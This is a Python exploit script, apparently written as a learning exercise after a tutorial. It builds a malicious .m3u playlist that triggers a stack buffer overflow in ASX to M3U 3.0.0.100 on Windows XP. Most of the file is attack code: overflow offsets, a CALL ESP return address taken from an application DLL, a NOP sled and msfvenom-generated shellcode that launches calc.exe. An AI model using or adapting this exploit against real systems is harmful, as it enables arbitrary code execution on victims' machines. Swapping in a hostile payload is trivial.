#!/usr/bin/python

# Author: Michael Music
# Date: 6/8/2019
# Description: ASX to M3U 3.0.0.100 Buffer Overflow Exploit
#  Exercise in BOFs following the securitysift guide
#  Tested on Windows XP

out = 'crash.m3u'
junk = 'A' * 13000

# EIP at offset 4417
# ESP at offset 4425
junk += 'A' * 4417

# 0x100371f5 CALL ESP was found within an application dll
# !mona jmp -r esp -m "MSA2Mfilter03.dll"

# EIP
#exploit_string += 'C' * 4
eip = '\xf5\x71\x03\x10'

# ESP
padding = '\x90' * 16

# msfvenom -p windows/exec CMD=calc.exe -f python -b '\x00\xff\x0a\x0d' 
buf =  ""
buf += "\xdd\xc2\xbf\x7a\xa4\xaa\x41\xd9\x74\x24\xf4\x5d\x29"
buf += "\xc9\xb1\x31\x31\x7d\x18\x03\x7d\x18\x83\xed\x86\x46"
buf += "\x5f\xbd\x9e\x05\xa0\x3e\x5e\x6a\x28\xdb\x6f\xaa\x4e"
buf += "\xaf\xdf\x1a\x04\xfd\xd3\xd1\x48\x16\x60\x97\x44\x19"
buf += "\xc1\x12\xb3\x14\xd2\x0f\x87\x37\x50\x52\xd4\x97\x69"
buf += "\x9d\x29\xd9\xae\xc0\xc0\x8b\x67\x8e\x77\x3c\x0c\xda"
buf += "\x4b\xb7\x5e\xca\xcb\x24\x16\xed\xfa\xfa\x2d\xb4\xdc"
buf += "\xfd\xe2\xcc\x54\xe6\xe7\xe9\x2f\x9d\xd3\x86\xb1\x77"
buf += "\x2a\x66\x1d\xb6\x83\x95\x5f\xfe\x23\x46\x2a\xf6\x50"
buf += "\xfb\x2d\xcd\x2b\x27\xbb\xd6\x8b\xac\x1b\x33\x2a\x60"
buf += "\xfd\xb0\x20\xcd\x89\x9f\x24\xd0\x5e\x94\x50\x59\x61"
buf += "\x7b\xd1\x19\x46\x5f\xba\xfa\xe7\xc6\x66\xac\x18\x18"
buf += "\xc9\x11\xbd\x52\xe7\x46\xcc\x38\x6d\x98\x42\x47\xc3"
buf += "\x9a\x5c\x48\x73\xf3\x6d\xc3\x1c\x84\x71\x06\x59\x7a"
buf += "\x38\x0b\xcb\x13\xe5\xd9\x4e\x7e\x16\x34\x8c\x87\x95"
buf += "\xbd\x6c\x7c\x85\xb7\x69\x38\x01\x2b\x03\x51\xe4\x4b"
buf += "\xb0\x52\x2d\x28\x57\xc1\xad\x81\xf2\x61\x57\xde"

junk2 = 'A' * (14000-4417-4-4)

exploit_string = 'http://' + junk + eip + padding + buf + junk2

text = open(out, 'w')
text.write(exploit_string)
text.close
